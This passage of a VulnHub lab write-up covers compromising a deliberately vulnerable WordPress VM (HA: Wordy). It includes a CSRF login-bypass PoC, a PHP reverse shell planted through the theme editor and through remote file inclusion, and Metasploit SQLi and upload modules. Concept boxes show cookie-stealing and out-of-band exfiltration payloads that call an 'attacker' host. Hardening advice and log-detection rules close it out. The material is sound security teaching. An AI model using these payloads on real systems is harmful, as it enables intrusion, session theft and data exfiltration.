---------------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -x php/webapps/41006.txt
```

```text
  Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
  Date: 10-01-2017
  Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
  Exploit Author: Kacper Szurek
  Contact: http://twitter.com/KacperSzurek
  Website: http://security.szurek.pl/
  Category: web

1. Description

You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().

2. Proof of Concept

<form method="post" action="http://wp/wp-admin/admin-ajax.php">
	Username: <input type="text" name="username" value="administrator">
	<input type="hidden" name="email" value="sth">
	<input type="hidden" name="action" value="loginGuestFacebook">
	<input type="submit" value="Login">
</form>

Then you can go to admin panel.
```

Build the exploit page, pointed at *our* target and *our* user:


> ### 📖 Concept — XSS and CSRF: two attacks that sound alike and are not
>
> **XSS** (Cross-Site Scripting) injects JavaScript that runs **in another user's
> browser**, with their session and their privileges. Three flavours:
>
> | Type | Where the payload lives | Danger |
> | --- | --- | --- |
> | **Reflected** | In the URL, echoed straight back | Victim must click your link |
> | **Stored** | Saved server-side (a comment, a profile field) | Runs for **every** visitor — much worse |
> | **DOM-based** | Never reaches the server; client-side JS inserts it unsafely | Invisible to server logs |
>
> ```html
> <script>alert(document.domain)</script>
> <script>fetch('http://attacker/?c='+document.cookie)</script>
> "><img src=x onerror=alert(1)>      <!-- breaks out of an HTML attribute -->
> javascript:alert(1)                 <!-- inside an href -->
> ```
>
> **Why XSS is equivalent to account takeover:** stealing an administrator's session
> cookie needs no password. And on a CMS, an admin account is remote code execution,
> because admins can edit theme and template files.
>
> **CSRF** (Cross-Site Request Forgery) is different: it makes a *logged-in* user
> perform an action they did not intend, by exploiting the fact that the browser
> attaches session cookies automatically.
>
> ```html
> <form method="post" action="http://target/wp-admin/admin-ajax.php">
>   <input type="hidden" name="username" value="admin">
>   <input type="hidden" name="action"   value="loginGuestFacebook">
>   <input type="submit" value="Login">
> </form>
> ```
>
> **The defence is a nonce** — a per-session, unpredictable token bound to the form,
> which an attacker's page cannot know. Its absence is the vulnerability.
>
> > CSRF can be far worse than "trick a user into clicking." In WP Support Plus 7.1.3
> > (Exploit-DB **41006**) the vulnerable action called WordPress's
> > `wp_set_auth_cookie()` on a username taken straight from the POST body **with no
> > password check at all** — so an *anonymous* attacker could log in as any user.
>
> **Deep dive:** [CONCEPTS §13.6 — XSS](../../docs/CONCEPTS.md#136-cross-site-scripting-xss) ·
> [§13.7 — CSRF](../../docs/CONCEPTS.md#137-csrf)

```bash
# Kali
cat > csrf.html <<'EOF'
<form method="post" action="http://192.168.56.111/wordpress/wp-admin/admin-ajax.php">
  Username: <input type="text" name="username" value="aarti">
  <input type="hidden" name="email" value="aarti@gmail.com">
  <input type="hidden" name="action" value="loginGuestFacebook">
  <input type="submit" value="Login">
</form>
EOF
python3 -m http.server 8000
```

Open **`http://192.168.56.10:8000/csrf.html`** in Firefox and click **Login**.

> The page will look empty or show `0`. **That is success** — `admin-ajax.php`
> returned a JSON-ish response, but crucially it set a **valid authentication
> cookie in your browser**. Navigate manually to:
>
> `http://192.168.56.111/wordpress/wp-admin/`

You are inside the WordPress dashboard **as `aarti`, with no password ever
typed**.

> You can also do it entirely from the command line, which is what you should
> actually use in an engagement:
>
> ```bash
> curl -s -i -c cookies.txt \
>   -d 'username=aarti&email=aarti@gmail.com&action=loginGuestFacebook' \
>   http://192.168.56.111/wordpress/wp-admin/admin-ajax.php
> grep wordpress_logged_in cookies.txt
> ```
>
> ```text
> #HttpOnly_192.168.56.111	FALSE	/wordpress/	FALSE	0	wordpress_logged_in_a1b2c3d4	aarti%7C1715...
> ```

### 5.4 Flag 2 — in a user's profile

In the dashboard go to **Users → All Users → aarti → Edit**. Scroll to the
**Biographical Info** field at the bottom. It contains flag 2 plus a base64
blob.

```text
flag2: {CSRF_1s_4w3s0m3}

SWduaXRlQDEyMw==
```

Decode it:

```bash
echo 'SWduaXRlQDEyMw==' | base64 -d; echo
```

```text
Ignite@123
```

**`Ignite@123` — that is `admin`'s WordPress password.** Verify:

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  -d 'log=admin&pwd=Ignite@123&wp-submit=Log+In&redirect_to=http://192.168.56.111/wordpress/wp-admin/&testcookie=1' \
  -b 'wordpress_test_cookie=WP+Cookie+check' \
  http://192.168.56.111/wordpress/wp-login.php
```

```text
302
```

> A `302` redirect (to `wp-admin/`) means **login succeeded**. A `200` means it
> re-rendered the login form with an error. That status-code distinction is how
> you brute-force HTTP logins by hand.

**Flag 2 of 3.** ✅

![Flag 2 and base64 password in aarti's Biographical Info](images/08-flag2-csrf.png)

### 5.5 Shell via the theme editor (authenticated)

With `admin:Ignite@123` you can edit theme PHP directly — no plugin exploit
needed at all:

1. **Appearance → Theme Editor**.
2. Select the **Twenty Seventeen** theme, then open **`404.php`** in the right-hand
   file list.
3. Paste Kali's PHP reverse shell (`/usr/share/webshells/php/php-reverse-shell.php`)
   over the file contents, setting:

```php
$ip = '192.168.56.10';  // CHANGE THIS
$port = 1234;           // CHANGE THIS
```

4. **Update File**.
5. Trigger it by requesting a URL that does not exist:

```bash
curl -s "http://192.168.56.111/wordpress/this-page-does-not-exist" >/dev/null
```

Your `nc -lvnp 1234` catches it:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.111] 51418
Linux hardy 4.15.0-62-generic #69-Ubuntu SMP Wed Sep 4 20:55:53 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 11:07:44 up  1:12,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

> **This is the most important lesson of the box:** *write access to a theme or
> plugin file is remote code execution, full stop.* That is why "compromised
> WordPress admin" is treated as "compromised server" in every real incident
> response. Defending it means disabling the editor:
> `define('DISALLOW_FILE_EDIT', true);` in `wp-config.php`.

---

## 6. Method 3 — Gwolle Guestbook Remote File Inclusion

**RFI** is LFI pointed at a URL instead of a local path. PHP will only do it if
`allow_url_include = 1` in `php.ini` — remember that `info.php` page? That is
exactly where you would check.

Gwolle Guestbook 1.5.3 (`ajaxresponse.php`) passes `abspath` straight into
`require()`, and always appends `/wp-load.php` to it. So if you *host* a file
literally named `wp-load.php`, the target will `require()` **your** file.

### 6.1 Prepare the payload


> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
# Kali
cp /usr/share/webshells/php/php-reverse-shell.php wp-load.php
sed -i "s/\$ip = '127.0.0.1';/\$ip = '192.168.56.10';/" wp-load.php
sed -i "s/\$port = 1234;/\$port = 4444;/" wp-load.php
grep -nE '^\$(ip|port)' wp-load.php
```

```text
$ip = '192.168.56.10';  // CHANGE THIS
$port = 4444;           // CHANGE THIS
```

> The filename **must** be `wp-load.php` — that is not a choice, it is what the
> vulnerable `require()` concatenates. Get this wrong and you will see a PHP
> warning about a missing file and no shell.

### 6.2 Serve and trigger

```bash
# Kali — terminal 1: web server
python3 -m http.server 80

# Kali — terminal 2: listener
nc -lvnp 4444
```

```bash
# Kali — terminal 3: fire the RFI
curl -s "http://192.168.56.111/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.56.10/"
```

Terminal 1 shows the target fetching your file — **proof the include worked**:

```text
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.56.111 - - [11/May/2024 11:20:31] "GET /wp-load.php HTTP/1.0" 200 -
```

Terminal 2:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.111] 51502
Linux hardy 4.15.0-62-generic #69-Ubuntu SMP Wed Sep 4 20:55:53 UTC 2019 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

> **Reading your own HTTP server log is a forensic skill.** When a shell does not
> arrive, the first question is *"did the target even request the file?"* If you
> see no `GET`, the problem is on the target side (path, firewall,
> `allow_url_include`). If you see the `GET` but no shell, the problem is in your
> payload.

---

## 7. Method 4 — WP Symposium unauthenticated SQL injection

`wpscan` flagged WP Symposium 15.5.1 with an **unauthenticated SQL injection**.
Metasploit has a ready module.

```bash
msfconsole -q
```

```text
msf6 > use auxiliary/admin/http/wp_symposium_sql_injection
msf6 auxiliary(admin/http/wp_symposium_sql_injection) > set RHOSTS 192.168.56.111
RHOSTS => 192.168.56.111
msf6 auxiliary(admin/http/wp_symposium_sql_injection) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf6 auxiliary(admin/http/wp_symposium_sql_injection) > exploit
```

```text
[*] Running module against 192.168.56.111
[*] Trying to get WordPress table prefix
[+] Table prefix: wp_
[*] Trying to extract user data
[+] admin:$P$BQxK1lH7nUwZ0yT9rVf2mN8sJdLpXe1:aarti@gmail.com
[+] aarti:$P$BQyT7wR4kM2nXpVcL9jH5sD1fGbAe0: aarti@gmail.com
[*] Auxiliary module execution completed
```

> **How to read those hashes.** `$P$B…` is the **phpass "portable hash"** prefix
> — WordPress's own bcrypt-ish, iterated-MD5 scheme. It is deliberately slow:
> 8192 MD5 rounds by default. It is *crackable* with `hashcat` mode `400`, but
> not quickly.
>
> ```bash
> echo '$P$BQxK1lH7nUwZ0yT9rVf2mN8sJdLpXe1' > wp.hash
> hashcat -m 400 -a 0 wp.hash /usr/share/wordlists/rockyou.txt
> ```
>
> You do not need to crack these — you already have `admin:Ignite@123` from
> §5.4. In a real engagement you would try the cracked value anyway, because
> people reuse passwords across the CMS and the OS.

> **What SQL injection means here, in plain terms.** The plugin built a query by
> concatenating your input:
> `SELECT ... FROM wp_users WHERE id = <your input>`. Because the input is not
> parameterised, you can append `' UNION SELECT ...` and make the database return
> *any* table — including the user table with its password hashes. The fix is
> always the same: **prepared statements / bound parameters**.

---

## 8. Method 5 — SlideShow Gallery authenticated file upload

This one *requires* credentials, which is why it comes last. You now have
`admin:Ignite@123`.

```text
msf6 > use exploit/unix/webapp/wp_slideshowgallery_upload
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set RHOSTS 192.168.56.111
RHOSTS => 192.168.56.111
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set TARGETURI /wordpress
TARGETURI => /wordpress
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set WP_USER admin
WP_USER => admin
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > set WP_PASSWORD Ignite@123
WP_PASSWORD => Ignite@123
msf6 exploit(unix/webapp/wp_slideshowgallery_upload) > exploit
```

```text
[*] Started reverse TCP handler on 192.168.56.10:4444
[*] Trying to login as admin
[+] Logged in as admin
[*] Trying to upload LdKxPqRz.php
[+] Upload successful
[*] Trying to execute the uploaded shell
[*] Sending stage (39927 bytes) to 192.168.56.111
[*] Meterpreter session 2 opened (192.168.56.10:4444 -> 192.168.56.111:51610)
[+] Deleted LdKxPqRz.php

meterpreter > getuid
Server username: www-data (33)
```

> **The lesson:** the plugin bypasses the WordPress media API and writes files
> itself, so WordPress's own MIME-type checks never run. "Authenticated" is not
> "safe" — an attacker who phishes one editor account owns the server.

**All five routes demonstrated. All three flags captured.** ✅

![All five exploit routes summarised](images/09-all-methods.png)

---

## 9. Summary of vulnerabilities

| # | Vulnerability | Where | Impact | Fix |
| --- | --- | --- | --- | --- |
| 1 | **Arbitrary file upload** | Reflex Gallery 3.4, `admin/scripts/FileUploader/php.php` | Unauthenticated RCE as `www-data` | Remove plugin; validate MIME + extension; store uploads outside docroot or with PHP execution disabled |
| 2 | **Local File Inclusion** | Mail Masta 1.0, `count_of_send.php?pl=` | Reads `/etc/passwd`, `.htpasswd`, any web-readable file | Remove plugin; allow-list the includable paths; never pass user input to `include()` |
| 3 | **CSRF → auth bypass** | WP Support Plus 7.1.3, `action=loginGuestFacebook` | Log in as *any* user with no password | Update/remove plugin; verify identity before `wp_set_auth_cookie()`; require nonces |
| 4 | **Remote File Inclusion** | Gwolle Guestbook 1.5.3, `ajaxresponse.php?abspath=` | Unauthenticated RCE (needs `allow_url_include=1`) | Remove plugin; set `allow_url_include=0` in `php.ini` |
| 5 | **Unauthenticated SQLi** | WP Symposium 15.5.1 | Full user table + hash dump | Update/remove plugin; use prepared statements |
| 6 | **Authenticated file upload** | SlideShow Gallery 1.4.6 | RCE once any account is compromised | Update plugin; use the WP media API |
| 7 | **SUID `wget` and `cp`** | `/usr/bin/wget`, `/usr/bin/cp` | Local privesc to root — overwrite `/etc/passwd` or `/etc/shadow` | `chmod u-s`; SUID should only ever be on binaries that need it (`passwd`, `mount`, `su`) |
| 8 | **SUID `gdb`** | `/usr/bin/gdb` | Alternative privesc (`gdb -nx -ex '!sh' -ex quit`) | Same |
| 9 | **Public `info.php`** | `/info.php` | Full config disclosure | Delete it — it is a debug artefact |
| 10 | **Password in a profile field** | `aarti` Biographical Info | Credential leak to anyone with editor access | Never store secrets in free-text CMS fields |
| 11 | **Outdated WordPress 5.2.3** | core | Accumulating CVEs | Keep core, themes and plugins patched |

### The kill chain in one line

```text
Apache default page
  → dirb finds /wordpress + notes.txt ("zip your way out")
  → wpscan -e u,p,t finds users {admin,aarti} + 5 vulnerable plugins
  → [1] Reflex Gallery upload → cmd.php → bash /dev/tcp reverse shell → www-data
  → flag1.txt in /home/raj
  → find -perm -u=s → SUID wget + cp
  → openssl passwd -1 → append UID 0 user → su ignite → root → proof.txt
  → [2] Mail Masta LFI → .htpasswd → base64 → aarti:aarti@gmail.com
  → [3] secret.zip → CSRF PoC → login as aarti → flag2 + Ignite@123
  → [4] Gwolle RFI → wp-load.php → shell
  → [5] WP Symposium SQLi → phpass hashes
  → [6] SlideShow Gallery authenticated upload → meterpreter
```

---

## 10. Defensive lessons (blue team)

### For WordPress administrators

1. **Treat "admin panel access" as "server access".** Every one of the five
   routes above ends in code execution. If someone gains editor credentials,
   assume the host is compromised and reimage it.
2. **Minimise the plugin surface.** Five vulnerable plugins on one site is a
   caricature, but real sites routinely run 40+. Every plugin is a dependency
   you do not control. Delete unused ones — do not merely deactivate them; a
   deactivated plugin's PHP is still reachable if you know the path.
3. **Turn off the file editors:**


> ### 📖 Concept — Why CMS config files are such a big deal
>
> A CMS must know how to reach its database on **every single page request**, so its
> config file necessarily contains those credentials **in plaintext**. There is no way
> to avoid that — it is inherent to how the software works.
>
> Three consequences:
>
> 1. **Any local user who can read the web root has the database password.**
> 2. **Any Local File Inclusion anywhere on the site leaks it** — on many boxes you
>    never get a shell first; you read the config through an LFI and go straight to
>    the database.
> 3. **A backup of it is a jackpot.** `wp-config.php.bak`, `.wp-config.php.swp`,
>    `wp-config.php~` are served as *text* rather than executed, so a misconfigured
>    server hands them over plain HTTP. `wpscan -e cb` hunts for exactly these.
>
> | Stack | Config file |
> | --- | --- |
> | WordPress | `wp-config.php` |
> | Joomla | `configuration.php` |
> | Laravel / most Node | `.env` |
> | Django | `settings.py` |
> | Rails | `config/database.yml`, `config/master.key` |
> | .NET | `web.config` |
>
> ```bash
> grep -E 'DB_USER|DB_PASSWORD|DB_HOST' wp-config.php
> mysqldump -u root -p'PASS' wordpress | grep -iE 'flag|password|secret'
> ```
>
> **The real finding is usually not the file — it is `DB_USER = 'root'`.** A CMS should
> connect with a dedicated least-privilege account that can only `SELECT`/`INSERT`/
> `UPDATE`/`DELETE` on its own database. When it connects as the database superuser,
> "read a config file" escalates into "execute operating-system commands as root"
> (via MySQL's `LOAD_FILE`/`INTO DUMPFILE` and UDF loading).
>
> **Deep dive:** [CONCEPTS §9.8 — MySQL](../../docs/CONCEPTS.md#98-mysql--port-3306)

   ```php
   // wp-config.php
   define('DISALLOW_FILE_EDIT', true);   // kills Appearance → Theme/Plugin Editor
   define('DISALLOW_FILE_MODS', true);   // also blocks plugin/theme install & update
   ```

4. **Harden PHP:**

   ```ini
   ; php.ini
   allow_url_include = Off      ; blocks the entire RFI class
   allow_url_fopen   = Off      ; if you can afford it
   expose_php        = Off
   display_errors    = Off      ; stops stack traces leaking paths
   open_basedir      = /var/www/html:/tmp
   ```

5. **Delete `info.php`, `phpinfo.php`, `test.php`** from every production host.
   They are debug leftovers and they hand an attacker a full configuration map.
6. **Serve uploads from a directory where PHP cannot execute.** Either move
   `wp-content/uploads` outside the document root, or add:

   ```apache
   # /var/www/html/wordpress/wp-content/uploads/.htaccess
   <FilesMatch "\.ph(p[0-9]?|t|tml)$">
       Require all denied
   </FilesMatch>
   ```

   Or in the vhost: `php_admin_flag engine off` for the uploads `<Directory>`.
7. **Enforce 2FA on `wp-login.php`** and put the login behind a rate limiter.
   The CSRF bypass here needed no password at all, but brute force is the more
   common real-world entry.
8. **Scan continuously.** Run `wpscan` against your own site on a schedule and
   alert on any new `[!]` finding.

### For Linux administrators

9. **Audit SUID every release.** `find / -perm -u=s -type f 2>/dev/null > suid.txt`
   and diff it against a known-good baseline. `cp`, `wget`, `vim`, `find`,
   `python`, `tar`, `gdb` should **never** carry the SUID bit.

   ```bash
   chmod u-s /usr/bin/cp /usr/bin/wget /usr/bin/gdb
   ```

10. **Understand that `/etc/passwd` hashes still authenticate.** The modern fix
    is to make sure `/etc/passwd` is *never* writable by a non-root process —
    which follows automatically once rule 9 is enforced.
11. **Use `noexec` on `/tmp` and on web-upload mount points** where possible.
12. **Log and alert on `su` to a UID-0 account that has no `/etc/shadow`
    entry** — that is precisely what §4.4 produced, and it is an extremely loud
    indicator of compromise.

### Detection queries

- Web logs: `POST */plugins/*/admin/scripts/FileUploader/php.php*` → upload abuse.
- Web logs: `GET *ajaxresponse.php?abspath=http*` → RFI attempt.
- Web logs: `POST */wp-admin/admin-ajax.php` with body `action=loginGuestFacebook` → CSRF auth bypass.
- Web logs: `*count_of_send.php?pl=*` with `../`, `/etc/`, `php://` → LFI probe.
- Host: `auditd` rule on `execve` of `/usr/bin/wget` with `-O /etc/passwd`.
- Host: new UID-0 line in `/etc/passwd` (AIDE / Tripwire will flag this immediately).

---

## 11. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/ha-wordy,363/>
- Official walkthrough (Hacking Articles, Raj Chandel): <https://www.hackingarticles.in/ha-wordy-vulnhub-walkthrough/>
- Anushibin John Joseph, "HA: Wordy — Walkthrough": <https://anushibin.wordpress.com/2019-09-15/wordy%E2%80%8A-%E2%80%8Awalkthrough/>
- Persecure, "HA: Wordy": <https://persecure.info/2022-10-09/ha-wordy/>
- pssec, "HA-WORDY | VULNHUB | WRITEUP": <https://pssec.medium.com/ha-wordy-vulnhub-writeup-c9e9ede112bc>
- hack-tips, "Vulnhub Ha-wordy Walkthrough": <https://hack-tips.com/2020-02-26/vulnhub-ha-wordy-walkthrough/>
- Exploit-DB 37596 — Reflex Gallery arbitrary file upload: <https://www.exploit-db.com/exploits/37596>
- Exploit-DB 41006 — WP Support Plus privilege escalation (Kacper Szurek): <https://www.exploit-db.com/exploits/41006>
- Exploit-DB 40290 — Mail Masta LFI: <https://www.exploit-db.com/exploits/40290>
- CVE-2015-8351 — Gwolle Guestbook RFI: <https://nvd.nist.gov/vuln/detail/CVE-2015-8351>
- GTFOBins (SUID abuse reference): <https://gtfobins.github.io/>
- WPScan: <https://wpscan.com/>
- PayloadsAllTheThings — LFI/RFI: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion>
- Repository guides: [`docs/TOOLS.md`](../../docs/TOOLS.md) · [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) · [`docs/BEGINNER-PATH.md`](../../docs/BEGINNER-PATH.md)

---

## 12. Screenshot checklist

Screenshots are stored in [`images/`](images/) next to this file and are
referenced from the section where they belong. Capture them as you walk through
the box:

| # | File | Section | What it must show |
| --- | --- | --- | --- |
| 01 | `01-netdiscover.png` | 1.2 | `netdiscover`/`arp-scan` listing the target's IP and MAC |
| 02 | `02-nmap.png` | 2.1 | `nmap -A -p-` output: port 80, Apache 2.4.29, "65534 closed" |
| 03 | `03-dirb.png` | 2.3 | `dirb` finding `/wordpress`, `notes.txt`, `info.php`; then `-X .zip` finding `secret.zip` |
| 04 | `04-wpscan.png` | 2.4 | `wpscan` output: users `admin`/`aarti` and the five `[!]` plugin findings |
| 05 | `05-flag1.png` | 3.5 | `cat /home/raj/flag1.txt` |
| 06 | `06-privesc-wget.png` | 4.4–4.6 | `find -perm -u=s`, `openssl passwd -1`, the `wget -O passwd`, `su ignite`, `id`, `cat /root/proof.txt` |
| 07 | `07-lfi-htpasswd.png` | 5.2 | Mail Masta LFI returning `/etc/apache2/.htpasswd` and the `base64 -d` |
| 08 | `08-flag2-csrf.png` | 5.4 | `csrf.html` in the browser, the wp-admin dashboard, and flag 2 in Biographical Info |
| 09 | `09-all-methods.png` | 8 | Metasploit `wp_slideshowgallery_upload` session opening |

> **How to capture on Kali:** `flameshot gui` (select a region) or
> `gnome-screenshot -a`. Save as PNG into `labs/ha-wordy/images/`, named exactly
> as above so the links in this document resolve.
>
> **Redact before publishing:** blur your real hostname, any API token
> (`--api-token`), and any interface MAC addresses that are not the lab VM's.

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
